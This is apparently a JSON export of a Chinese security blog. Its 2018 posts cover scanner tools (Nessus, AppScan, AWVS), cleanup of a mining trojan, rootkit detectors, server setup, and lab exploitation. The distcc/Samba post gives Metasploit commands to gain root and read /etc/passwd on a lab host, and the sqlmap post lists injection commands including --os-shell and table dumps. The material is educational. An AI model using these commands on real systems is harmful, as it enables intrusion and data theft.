文件夹”部分始终包含以下不能删除的默认文件夹：我的扫描、所有扫描、废纸搂。 当您访问“ 扫描”页面时，将显示“ 我的扫描”文件夹。当您创建扫描时，它默认显示在“ 我的扫描”文件夹中。 在所有扫描的文件夹显示所创建的所有扫描以及与有权限进行交互的任何扫描。可以点击文件夹中的扫描来查看扫描结果。 废纸篓”文件夹显示已删除的扫描。可以从Nessus实例中永久删除扫描，或将扫描恢复到选定的文件夹。如果删除包含扫描的文件夹，则该文件夹中的所有扫描都将移至“ 废纸篓”文件夹。存储在“ 垃圾箱”文件夹中的扫描将在30天后自动删除。 插件规则 ​ 允许你隐藏或改变任何给定的插件的严重性。另外，规则可以限制在特定的主机或特定的时间范围内。在此页面上，您可以查看，创建，编辑和删除您的规则。 扫描器 该扫描器页面显示的链接键和遥控器的扫描器列表。您可以点击链接的扫描器查看有关该扫描器的详细信息。 扫描器由扫描器类型标识，并指示扫描器是否具有共享权限。 可以使用链接密钥或有效帐户凭证将远程扫描器链接到Nessus Manager。一旦链接，扫描器可以在本地进行管理，并在配置扫描时进行选择。 扫描模板 ​ 可用的模板可能会有所不同。Nessus界面提供产品中每个模板的简要说明 设置 ​ 每个策略都存在以下设置，但可用的配置项目可能因所选模板而异： 凭证 ​ 每个策略都存在以下设置，但可用的配置项目可能因所选模板而异： 云服务 数据库：包括MongoDB，Oracle，MySQL，DB2，PostgreSQL和SQL Server 主机：其中包括Windows登录，SSH和SNMPv3 其他服务：VMware，Red Hat Enterprise Virtualization等 明文身份验证机制：包括FTP，HTTP，POP3和其他服务 合规检测 ​ Nessus可以执行网络服务的漏洞扫描以及登录到服务器以发现任何缺少的补丁。没有漏洞并不意味着服务器配置是正确的，或者与特定标准要求“相符” 插件 ​ 插件选项可以选择插件系列的安全检查或单个插件检查 “ 关于”页面显示Nessus许可和插件信息的概述。当您访问产品设置时，默认情况下出现关于页面。 SMTP服务 “ SMTP服务器”页面显示允许您配置简单邮件传输协议（SMTP）服务器的选项。当您配置SMTP服务器时，Nessus会将扫描结果通过电子邮件发送到您指定的收件人列表。 用户 ​ 在此页面上，您可以查看，创建，编辑和删除用户。一旦创建，用户就配置了一个角色，它决定了他们的扫描器权限。 命令行： 启动或停止Nessus ​ Windows 1、导航到 服务。 2、在 名称 列中，单击Tenable Nessus。 3、要停止Nessus服务，请右键单击 Tenable Nessus，然后单击停止。 4、要重新启动Nessus服务，请右键单击 Tenable Nessus，然后单击开始。 Linux 扫描报告 点击扫描结果文件夹，选择要下载的扫描任务 选择下载目标，点击左上角输出，选择输出文件格式。 【官网链接】https://www.tenable.com/products/nessus-home","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/categories/安全工具/"}],"tags":[{"name":"Nessus","slug":"Nessus","permalink":"http://yoursite.com/tags/Nessus/"},{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/tags/安全工具/"}]},{"title":"AppScan工具基本使用","slug":"AppScan工具基本使用","date":"2018-08-20T07:12:39.000Z","updated":"2018-08-20T07:29:39.603Z","comments":true,"path":"2018/08/20/AppScan工具基本使用/","link":"","permalink":"http://yoursite.com/2018/08/20/AppScan工具基本使用/","excerpt":"0x01 【前言】Ratinal AppScan其实是一个产品家族，包括众多的应用安全扫描产品。从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。","text":"0x01 【前言】Ratinal AppScan其实是一个产品家族，包括众多的应用安全扫描产品。从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。 AppScan工作原理小结如下： 通过搜索（爬行）发现整个 Web 应用结构 根据分析，发送修改的 HTTP Request 进行攻击尝试（扫描规则库） 通过对于 Respone 的分析验证是否存在安全漏洞 AppScan扫描原理：扫描规则库+爬行+测试 AppScan 的核心是提供一个扫描规则库，然后利用自动化的“探索”技术得到众多的页面和页面参数，进而对这些页面和页面参数进行安全性测试。“扫描规则库”，“探索”，“测试”就构成了 AppScan 的核心三要素。而在安全扫描过程中，如何进行优化，就要结合这三个要素，看哪些部分需要优化，应该如何优化。 0x02 【使用步骤】1、打开AppScan软件，点击工具栏上的文件，新建，出现一个dialog。 2、点击“Regular Scan”。出现扫描配置向导页面，这里是选择“AppScan”，如图： 3、输入扫描项目目标URL 4、点击“下一步”，选择认证模式，出现登录管理的页面，这是因为对于大部分网站，需要用户名和密码登录进去才可以查看许多内容，未登录的情况下就只可以访问部分页面。 5、点击“下一步”，出现测试策略的页面，可以根据不同的测试需求进行选择6、点击“下一步”，出现完成配置向导的界面，这里使用默认配置，可根据需求更改。 7、点击“完成”，设置保存路径，即开始扫描。 0x03 扫描结果 红色叹号表示高危漏洞，每一个漏洞都有详细的列出来，工具栏中的”报告“，可以将扫描结果导出来。 0x04 【参考资料】http://www.mamicode.com/info-detail-1879133.html http://www.360doc.com/content/17/0219/20/32626470_630367925.shtml","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/categories/安全工具/"}],"tags":[{"name":"AppScan","slug":"AppScan","permalink":"http://yoursite.com/tags/AppScan/"}]},{"title":"AWVS的基本使用","slug":"AWVS的基本使用","date":"2018-08-20T07:01:18.000Z","updated":"2018-08-20T07:20:44.909Z","comments":true,"path":"2018/08/20/AWVS的基本使用/","link":"","permalink":"http://yoursite.com/2018/08/20/AWVS的基本使用/","excerpt":"0x01 【前言】Acuneti Webb Vulnerability Scanner是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。现已更新到11，下面介绍9版本。","text":"0x01 【前言】Acuneti Webb Vulnerability Scanner是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。现已更新到11，下面介绍9版本。 0x02 【功能or特点】自动的客户端脚本分析器，允许对Ajax和Web 2.0应用程序进行安全性测试。 业内最先进且深入的SQL注入和跨站脚本测试； 高级渗透测试工具，例如HTTP Editor和HTTP Fuzzer； 可视化宏记录器帮助您轻松测试web表格和受密码保护的区域 支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证 机制 丰富的报告功能，包括 VISA PCI 依从性报告 高速的多线程扫描器轻松检索成千上万个页面 智能爬行程序检测 web 服务器类型和应用程序语言 Acunetix检索并分析网站，包括 flash 内容、SOAP 和 AJAX 端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查 可导出网站漏洞文件 0x03 AWVS menus bar（AWVS菜单栏） 0x04 AWVS工具栏从左到右分别是：新建扫描——网站扫描——网站爬行——目标查找——目标探 测——子域名扫描——SQL盲注——HTTP编辑——HTTP嗅 探——HTTP Fuzzer——认证测试——结果对比——WSDL扫 描——WSDL编辑测试——程序设置——扫描设置——侧重扫 描设置——计划任务——报告 0x05 AWVS 新建扫描1、点击菜单栏的 New Scan 新建一次扫描， 网站扫描开始前，需要 设定下面选项: （1). Scan type （2). Options （3). Target （4). Login （5). Finsh AWVS 新建扫描——Scan type AWVS 新建扫描——Options 接着，点击下一步按钮，在scanning profile里面选择安全扫面的漏洞种类（其实就是payload） Options——Scanning profile Scanning profile： 设置侧重扫描的类型，包含16种侧 重检测类型 AWVS 新建扫描——Target AWVS 新建扫描——Login 这个Login sequence，我要讲一下，当你的网站需要深入扫描的时候，我们就可以使用这个Login sequence功能，这个功能通过你输入网站的用户名密码登录之后，AWVS就可以扫描登录以后的权限页面，如果你不登录，那么，AWVS就没有权限扫描需要用户名密码登录之后的页面了（因为这些页面都需要特定的权限验证之后才能访问，所以，我把他们叫做权限页面），如果保持默认设置，那么AWVS就无权扫描你的权限页面，此处，我们使用默认设置就好了，点击下一步，来到完成设置页面。 AWVS 新建扫描——Finish 点击Finish，完成AWVS的扫描设置（点击Finish按钮之前，AWVS还未进行任何的安全扫描），当点击Finish按钮之后，AWVS就开始对你提供的域名（或者IP亦可）进行安全扫描了。 0x06 扫描结果 可以看到，右边，process=100.0%，看来安全扫描全部进行完毕，而process上面已经说的很清楚了，红色感叹号代表高危漏洞，黄色的感叹号代表中危漏洞，蓝色感叹号代表低危漏洞，绿色感叹号代表信息泄露，其实，我们在做渗透测试的大多数时候，只需要关注高危漏洞就可以了。 0x07 结果导出 主界面——Scanning Profiles scripts 主界面——Scan Setting 批量扫描 Acunetix的计划任务，主要特性如下:（a). 可用于大量扫描，扫描结果保存在“C:\\Users\\Public\\Documents\\AcunetixWVS 10\\Saves”。 （b). 扫描结束，可以使用邮件通知。 （c). 可设定计划时间，什么时候允许扫描，什么时候不允许扫描 蜘蛛爬行功能 目标探测工具（Target Finder） 子域名探测工具（Subdomain Scanner） SQL盲注测试工具（Blind SQL Injection） ➢AWVS的HTTP嗅探工具（HTTP Sniffer） ➢AWVS的HTTP模糊测试工具（HTTP Fuzzer） ➢AWVS的认证测试工具（Authentication Tester） ➢AWVS的WEB WSDL扫描测试工具（Web Services Scanner、 Web Services Editor） 0x08 参考文献https://blog.csdn.net/lynnlinlin/article/details/52947526","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/categories/安全工具/"}],"tags":[{"name":"AWVS","slug":"AWVS","permalink":"http://yoursite.com/tags/AWVS/"}]},{"title":"查杀\"一路赚钱木马\"","slug":"查杀一路赚钱木马","date":"2018-08-20T03:01:22.000Z","updated":"2018-08-20T03:18:10.241Z","comments":true,"path":"2018/08/20/查杀一路赚钱木马/","link":"","permalink":"http://yoursite.com/2018/08/20/查杀一路赚钱木马/","excerpt":"0x01 【准备工作】虚拟机的网络适配器选择NAT连接，防止感染物理主机。","text":"0x01 【准备工作】虚拟机的网络适配器选择NAT连接，防止感染物理主机。 植入木马：将mservice.sh的执行文件放在根（/）目录下 执行脚本开始挣钱：1sudo bash mservice.sh 55138 //55138为自己的一路挣钱ID号 0x02 【查找木马】1.通过查看top 看到CPU占有197.7% （2个CPU） 2.通过lsof -p 51885查看xig的进程目录，和用lsof -i 查看端口开放状态。3.通过命令cat /etc/passwd 发现了陌生用户和可疑 4.用iostat命令查看块设备运行状态 5.用netstat -anplt查看端口开放情况，发现了几个可疑的端口和对应的服务。 6.用crontab -l命令查看计划任务，发现了可疑状态。 7.在/opt中目录中新增了如下的可疑文件 8.查看这些文件的内容如下： 9.查看开机启动项systemctl list-unit-files | grep enable，发现YiluzhuanqianSer.service服务。 10.其他：（1）通过命令find . -type -f atime -3搜索最近3天内被访问过的所有文件 （2）history 查看命令历史。less tail -200 .bash_history查看200条各用户命令记录。 （3）last查看最近登录用户。 （4）检测alias别名 0x03 【清除木马】1.去除可疑文件的权限 2.删除可以的文件和目录 3.清除计划任务。1crontab -r //清除计划任务 4.关掉可疑的开机自启服务YiluzhuanqianSer.service 5.查看进程，杀死可疑的服务进程123ps auxkill -9 51877 6、reboot 重启0x04 【检测已经清除木马】CUP运行正常： 端口开放正常： 一路赚钱后台212的IP已经离线： 0x05 【参考文献】https://www.jianshu.com/p/26d1567c4d0b https://wenku.baidu.com/view/d9c72c596c85ec3a86c2c54e.html","categories":[{"name":"木马查杀","slug":"木马查杀","permalink":"http://yoursite.com/categories/木马查杀/"}],"tags":[{"name":"木马查杀","slug":"木马查杀","permalink":"http://yoursite.com/tags/木马查杀/"}]},{"title":"编译安装rkhunter && chkrootkit(后门检测工具)","slug":"编译安装rkhunter-chkrootkit-后门检测工具","date":"2018-08-20T02:50:29.000Z","updated":"2018-08-20T02:59:25.064Z","comments":true,"path":"2018/08/20/编译安装rkhunter-chkrootkit-后门检测工具/","link":"","permalink":"http://yoursite.com/2018/08/20/编译安装rkhunter-chkrootkit-后门检测工具/","excerpt":"安装包类型：rkhunter-1.4.6.tar.gzchkrootkit.tar.gz","text":"安装包类型：rkhunter-1.4.6.tar.gzchkrootkit.tar.gz 一、rkhunter（后门检测工具）rootkit是Linux平台下最常见的一种木马后门工具，它主要通过替换系统文件来达到入侵和和隐蔽的目的，这种木马比普通木马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木马。rootkit攻击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻击者保住权限，以使它在任何时候都可以使用root 权限登录到系统。 1.解压rkhunter安装包123tar -zxf rkhunter-1.4.6.tar.gz cd rkhunter-1.4.6/./installer.sh --install 2.为基本系统程序建立校对样本，建议系统安装完成后就建立。12rkhunter --propupdls /var/lib/rkhunter/db/rkhunter.dat 3.运行rkhunter检查系统 它主要执行下面一系列的测试: ​ 1. MD5校验测试, 检测任何文件是否改动. ​ 2. 检测rootkits使用的二进制和系统工具文件. ​ 3. 检测特洛伊木马程序的特征码. ​ 4. 检测大多常用程序的文件异常属性. ​ 5. 执行一些系统相关的测试 - 因为rootkit hunter可支持多个系统平台. ​ 6. 扫描任何混杂模式下的接口和后门程序常用的端口. ​ 7. 检测如/etc/rc.d/目录下的所有配置文件, 日志文件, 任何异常的隐藏文件等等. 例如, 在检测/dev/.udev和/etc/.pwd.lock文件时候, 我的系统被警告. ​ 8. 对一些使用常用端口的应用程序进行版本测试. 如: Apache Web Server, Procmail等. 4.执行检测命令：1rkhunter --check 5.在线升级rkhunterrkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:1rkhunter --update 二、chkrootkitchkrootkit 在监测 rootkit 是否被安装的过程中，需要使用到一些操作系统本身的命令。但不排除一种情况，那就是入侵者有针对性的已经将 chkrootkit 使用的系统命令也做修改，使得 chkrootkit 无法监测 rootkit ，从而达到即使系统安装了 chkrootkit 也无法检测出 rootkit 的存在，从而依然对系统有着控制的途径，而达到入侵的目的。那样的话，用 chkrootkit 构建入侵监测系统将失去任何意义。对此，我们在操作系统刚被安装之后，或者说服务器开放之前，让 chkrootkit 就开始工作。而且，在服务器开放之前，备份 chkrootkit 使用的系统命 令，在一些必要的时候（怀疑系统命令已被修改的情况等等），让 chkrootkit 使用初始备份的系统命令进行工作。 1.解压chkrootkit压缩包1tar -zxvf chkrootkit.tar.gz 2.安装chkrootkit12cd chkrootkit-0.52/make sense 3.将chkrootkit移到系统启动目录下123mv chkrootkit /usr/sbin/chkrootkitchkrootkit | grep INFECTED 安装完成！ 参考文献：https://www.cnblogs.com/cp-miao/p/6141025.html https://www.osyunwei.com/archives/10099.html https://www.kafan.cn/edu/5550504.html","categories":[{"name":"安全工具","slug":"安全工具","permalink":"http://yoursite.com/categories/安全工具/"}],"tags":[{"name":"木马查杀","slug":"木马查杀","permalink":"http://yoursite.com/tags/木马查杀/"}]},{"title":"Distcc后门漏洞 && Samba sysmlink默认配置目录遍历漏洞","slug":"Distcc后门漏洞-Samba-sysmlink默认配置目录遍历漏洞","date":"2018-08-19T12:20:08.000Z","updated":"2018-08-19T12:34:56.187Z","comments":true,"path":"2018/08/19/Distcc后门漏洞-Samba-sysmlink默认配置目录遍历漏洞/","link":"","permalink":"http://yoursite.com/2018/08/19/Distcc后门漏洞-Samba-sysmlink默认配置目录遍历漏洞/","excerpt":"Distcc后门漏洞【目的】利用Distcc后门漏洞获取目标主机的root权限。","text":"Distcc后门漏洞【目的】利用Distcc后门漏洞获取目标主机的root权限。 【原理】Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制 【步骤】1234567891.在kali中执行msfconsole，启动metasploit 2use exploit/unix/misc/distcc_exec #选择漏洞show options #显示需要设置的参数set RHOST 192.168.199.126 #设置要攻击的靶机IPexploit #开始攻击 2.执行id 查看权限，uname -a 验证服务器信息。 Samba sysmlink默认配置目录遍历漏洞Samba是linux和unix系统上实现smb协议的一个免费软件，由客户机和服务器构成。 SMB是一种在局域网上实现共享文件和打印机的协议。存在一个服务器，客户机通过该协议可以服务器上的共享文件系统和打印机以及其他的资源。通过设置，还可以和全世界的电脑分享资源 : 【步骤】1234567891.在kali中执行msfconsole，启动metasploit2use auxiliary/admin/smb/samba_symlink_traversal #选择漏洞set RHOST 192.168.199.126 #设置要攻击的靶机IPset SMBSHARE tmp #设置SAM可写文件exploit #开始攻击 2.在新的终端下执行smbclient命令打开上面生成的共享目录12345smbclient //192.168.199.126/tmpcd rootfsls 3.列出密码1more /etc/passwd #列出密码文件，可用成功。","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://yoursite.com/categories/漏洞分析/"}],"tags":[{"name":"metasploit 2","slug":"metasploit-2","permalink":"http://yoursite.com/tags/metasploit-2/"},{"name":"msf","slug":"msf","permalink":"http://yoursite.com/tags/msf/"}]},{"title":"CentOS 下 LNMP 环境配置（yum安装）","slug":"CentOS-下-LNMP-环境配置（yum安装）","date":"2018-08-15T15:11:42.000Z","updated":"2018-08-15T15:29:07.036Z","comments":true,"path":"2018/08/15/CentOS-下-LNMP-环境配置（yum安装）/","link":"","permalink":"http://yoursite.com/2018/08/15/CentOS-下-LNMP-环境配置（yum安装）/","excerpt":"前言LNMP 环境代表 Linux 系统下 Nginx + MySQL + PHP 网站服务器架构。 Linux是一类Unix计算机操作系统的统称，是目前最流行的免费操作系统。代表版本有：debian、centos、ubuntu、fedora、gentoo等。","text":"前言LNMP 环境代表 Linux 系统下 Nginx + MySQL + PHP 网站服务器架构。 Linux是一类Unix计算机操作系统的统称，是目前最流行的免费操作系统。代表版本有：debian、centos、ubuntu、fedora、gentoo等。 Nginx是一个高性能的HTTP和反向代理服务器，也是一个IMAP/POP3/SMTP代理服务器。 Mysql是一个小型关系型数据库管理系统。 PHP是一种在服务器端执行的嵌入HTML文档的脚本语言。 这四种软件均为免费开源软件，组合到一起，成为一个免费、高效、扩展性强的网站服务系统。 安装配置 Nginx自动安装 Nginx。输入命令：12yum install nginx systemctl start nginx 浏览器中测试 Nginx 服务是否正常运行。访问 CentOS 云服务器公网 IP。 安装配置 MySQL注意： 从 CentOS 7 系统开始，MariaDB 成为 yum 源中默认的数据库安装包。在 CentOS 7 及以上的系统中使用 yum 安装 MySQL 包将无法使用 MySQL。您可以选择使用完全兼容的 MariaDB，或自行安装较低版本的 MySQL。 安装 MySQL。输入以下命令：1yum install mariadb mariadb-server 启动 MySQL 服务。1systemctl start mariadb.service 登录 MySQL ，删除空用户12MariaDB [(none)]&gt; select user,host,password from mysql.user;MariaDB [(none)]&gt; select user,host,password from mysql.user; 修改 root 密码。12MariaDB [(none)]&gt; update mysql.user set password = (&apos;toor&apos;) where user=&apos;root&apos;MariaDB [(none)]&gt; flush privileges; 安装配置 PHP安装 PHP 。输入命令进行安装：1yum install php lighttpd-fastcgi php-cli php-mysql php-gd php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-mssql php-snmp php-soap 安装所需组件使 PHP 支持 MySQL、FastCGI 模式。1yum install php-tidy php-common php-devel php-fpm php-mysql Nginx 与 PHP-FPM 集成启动 PHP-FPM。输入命令启动 PHP-FPM 服务1service php-fpm start 。 输入命令查看 PHP-FPM 默认配置1cat /etc/php-fpm.d/www.conf |grep -i &apos;listen =&apos; 返回结果为：listen = 127.0.0.1:9000，表明 PHP-FPM 默认配置的监听端口为 9000，只需修改配置，将 PHP 解析的请求转发到 127.0.0.0:9000 处理即可。 修改 Nginx 配置。 输入命令查找 Nginx 配置文件1nginx -t 使用vi命令修改该配置文件：1vim /etc/nginx/nginx.conf 修改红框里面的内容。 配置完成后，重启服务。1systemctl restart nginx 环境配置验证 用以下命令在 web 目录下创建 index.php：123vim /usr/share/nginx/html/index.php&lt;?php echo &quot;&lt;title&gt;Test Page&lt;/title&gt;&quot;; echo &quot;hello world&quot;; ?&gt; 验证：在浏览器中输入服务器ip:index.php，出现hello world页面，说明配置成功。","categories":[{"name":"搭建服务","slug":"搭建服务","permalink":"http://yoursite.com/categories/搭建服务/"}],"tags":[{"name":"LNMP","slug":"LNMP","permalink":"http://yoursite.com/tags/LNMP/"},{"name":"ngixn","slug":"ngixn","permalink":"http://yoursite.com/tags/ngixn/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"PHP","slug":"PHP","permalink":"http://yoursite.com/tags/PHP/"}]},{"title":"用Docker一分钟搭建WordPress博客","slug":"用Docker一分钟搭建WordPress博客","date":"2018-08-15T12:42:58.000Z","updated":"2018-08-15T12:57:28.252Z","comments":true,"path":"2018/08/15/用Docker一分钟搭建WordPress博客/","link":"","permalink":"http://yoursite.com/2018/08/15/用Docker一分钟搭建WordPress博客/","excerpt":"0x01 【前言】WordPress是一个非常著名的PHP编写的博客平台，发展到目前为止已经形成了一个庞大的网站平台系统。在WP上有规模庞大的插件和主题，可以帮助我们快速建立一个博客甚至网站。","text":"0x01 【前言】WordPress是一个非常著名的PHP编写的博客平台，发展到目前为止已经形成了一个庞大的网站平台系统。在WP上有规模庞大的插件和主题，可以帮助我们快速建立一个博客甚至网站。 在Windows上可以非常方便的安装WordPress，因为IIS上集成了WordPress的一键安装包。而在Linux上安装WordPress就比较复杂了，我们需要配置PHP环境、Apache或者Nginx服务器、MySQL数据库以及各种权限和访问问题。所以在Linux上最好的办法就是使用Docker来安装WordPress。 0x02 【安装环境】CentOS Linux release 7.5.1804(Core) 0x03 【安装步骤】一、安装Docker12345yum update -yyum -y install dockersystemctl start docker 验证安装 docker version 配置Docker 设置镜像1234567vim /etc/docker/daemon.json&#123; &quot;registry-mirrors&quot;: [&quot;https://aj2rgad5.mirror.aliyuncs.com&quot;]&#125; 重启Docker123systemctl daemon-reloadsystemctl restart docker.service 二、安装WordPress有了Docker，安装WordPress就很简单了，直接一条命令搞定。1docker pull wordpress:latest 三、安装MySQLWordPress需要使用MySQL数据库，这里也有两种方式，第一种是安装本地MySQL，第二种就是在Docker中安装MySQL镜像。如果要在Docker中安装MySQL也非常简单，同样一条命令搞定。1docker pull mysql:latest 启动MySQL使用下面的命令。1docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag name参数指定要启动的实例名称，MYSQL_ROOT_PASSWORD指定ROOT密码。tag参数是MySQL的版本号，可以是5.7、5.6、8.0 四、配置WordPress安装好数据库之后，就可以启动WordPress了。详细的文档参考这里。如果使用Docker中安装的MySQL实例，使用下面的命令。1docker run --name some-wordpress --link some-mysql:mysql -p 8080:80 -d wordpress name参数指定要启动的WordPress实例名称，link参数指定要使用的Docker MySQL实例名称，p参数将Docker内部的80端口映射到本地的8080端口上。 五、检测然后打开浏览器，输入localhost:8080（端口号是命令中设置的），然后就可以看到WordPress了。按照提示输入用户名等信息，然后安装WordPress。等到它提示安装完成，那么WordPress的安装就算大功告成了。 最后稍加配置，再添加诸如内网映射等功能之后，站点就可以对外访问了。 0x04 参考文献：https://blog.csdn.net/u011054333/article/details/70136099","categories":[{"name":"搭建博客","slug":"搭建博客","permalink":"http://yoursite.com/categories/搭建博客/"}],"tags":[{"name":"博客，mysql，wordpress","slug":"博客，mysql，wordpress","permalink":"http://yoursite.com/tags/博客，mysql，wordpress/"}]},{"title":"sqlmap基本使用","slug":"sqlmap基本使用","date":"2018-08-15T02:41:33.000Z","updated":"2018-08-15T02:50:08.302Z","comments":true,"path":"2018/08/15/sqlmap基本使用/","link":"","permalink":"http://yoursite.com/2018/08/15/sqlmap基本使用/","excerpt":"完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统 完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。","text":"完全支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、HSQLDB和Informix等多种数据库管理系统 完全支持布尔型盲注、时间型盲注、基于错误信息的注入、联合查询注入和堆查询注入。 在数据库证书、IP地址、端口和数据库名等条件允许的情况下支持不通过SQL注入点而直接连接数据库。 支持枚举用户、密码、哈希、权限、角色、数据库、数据表和列。 Liunx上安装sqlmap Windwos上安装sqlmap安装python环境，并设置环境变量 将SQLMAP安装包解压到文件夹sqlmap中，并拷贝到 “C:\\Python27” 目录下 SQLmap检测sql注入 使用python sqlmap.py -u ‘http://xxx/xx?id=1&#39; sqlmap -u “注入点地址” –cookie= -D 数据库 -T usr –column SQLmap通过注入获取当前数据库 使用python sqlmap.py -u ‘http://xxx/xx?id=1&#39; –current-db SQLmap通过注入获取数据库下的表 使用python sqlmap.py -ua ‘http://xxx/xx?id=1&#39; –tables -D database SQLmap通过注入获取表内数据 使用python sqlmap.py -u ‘http://xxx/xx?id=1&#39; –dump -T tables -D database SQLmap通过注入执行sql语句 使用 python sqlmap.py -u ‘http://xxx/xx?id=1&#39; –sql-shell SQLmap通过注入执行系统命令 使用 python sqlmap.py -u ‘http://xxx/xx?id=1&#39; –os-shell 若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就能利用SQL注入执行任意的操作系统命令。 当数据库管理系统是MySQL或PostgreSQL时，Sqlmap会通过前面介绍过的文件上传功能上传一个包含用户自定义函数sys_exec()和sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出。 获取目标方式1.直接连接到数据库 ​ 参数：-d ​ 对单个数据库实例运行sqlmap python sqlmap.py -d “mysql://admin:admin@192.168.1.2:3306/testdb” -f –banner –dbs –users 2.目标URL ​ 参数：-u或者—url ​ URL格式要求：http(s)://targeturl[:port]/[…] python sqlmap.py -u “http://www.target.com/vuln.php?id=1&quot; -f –banner –dbs –users 3.从Burp或WebScarab代理中获取日志 ​ 参数：-l ​ 把Burp proxy或者WebScarab proxy中的日志直接导出来交给sqlmap检测 4.从文本中获取多个目标扫描 ​ 参数：-m ​ URL保存在文本中，sqlmap会一个一个检测 5.从文件中加载HTTP请求 ​ 参数：-r ​ 【可以跳过设置一些其他参数比如cookie，POST数据】 ​ 当请求是HTTPS的时候要配合—force-ssl参数来使用，或者你可以在Host头后面加上:443 请求方式：1.http数据 ​ 参数：–data ​ 此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数 ​ python sqlmap.py -u “http://www.target.com/vuln.php&quot; –data=”id=1” -f –banner –dbs –users 2.参数拆分字符 ​ 参数：–param-del ​ 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数 ​ python sqlmap.py -u “http://www.target.com/vuln.php&quot; –data=”query=foobar;id=1” –param-del=”;” -f –banner –dbs –users 3.HTTP cookie头 ​ 参数：–cookie/–load-cookies/–drop-set-cookie ​ a.web应用需要登陆的时候 ​ b.你想要在这些头参数中测试SQL注入时 ​ 如果你不想接受set-cookie可以使用—drop-set-cookie参数来拒接 4.HTTP User-Agent头 ​ 参数：–user-agent/–random-agent ​ 【可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从./txt/user-agents.txt中获取】 ​ 当–level参数设定为3或者3以上的时候，会尝试对User-agent进行注入 探测：1.URI注入点 ​ 参数：-u ​ python sqlmap.py -u “http://www.target.com/vuln/param1/vuln1*/param2&quot; 2.指定数据库 ​ 参数：–dbms ​ sqlmap会自动探测web的应用后端数据库是什么 3.风险等级 ​ 参数：–risk ​ 共有四个风险等级，默认是1，会探测大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。 4.列出数据库系统的数据库 参数：–dbs 当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库 5.列举数据库表 参数：–tables,–exclude-sysdbs,-D 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。 ​ –exclude-sysdbs参数是指排除包含了所有数据库名的系统数据库。 ​ 需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。 6.列举数据库表中的字段 参数：–columns,-C,-T,-D 当前用户有权限读取包含所有数据库表信息的表中数据的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。 ​ 如果没有使用-D参数指定数据库时，默认会使用当前数据库。 7.获取整个表的数据 参数：–dump,-C,-T,-D,–start,–stop,–first,–last 如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。 ​ 使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。 可以获取指定库中的所有表的内容，使用–dump跟-D参数（不使用-T与-C参数）。 爆破：1.暴力破解表名 参数：–common-tables 当使用–tables无法获取到数据库的表时，可以使用此参数。通常是如下情况： 1、MySQL数据库版本小于5.0，没有information_schema表。 2、数据库是MicrossoftAccess，系统表MSysObjects是不可读的（默认）。 3、当前用户没有权限读取系统中保存数据结构的表的权限。 ​ 暴力破解的表在txt/common-tables.txt文件中，你可以自己添加。 2.暴力破解列名 参数：–common-columns 与暴力破解表名一样，暴力跑的列名在txt/common-columns.txt中。 补充：列取数据库 sqlmap.py -u [URL] –dbs 获取当前数据库 sqlmap.py -u [URL] –current-db 判断当前数据库用户角色 sqlmap.py -u [URL] –privileges 判断当前数据库用户是否为数据库管理员 sqlmap.py -u [URL] –-is-dba 列表名 sqlmap.py -u [URL] –dbms “mysql” –tables -D “db_name” 列字段 sqlmap.py -u [URL] –dbms “mysql” –columns -D “db_name” -T “ex_admin“ 获取字段内容 sqlmap.py -u [URL] –dbms “mysql” –dump -D “db_name” -T “ex_admin” -C 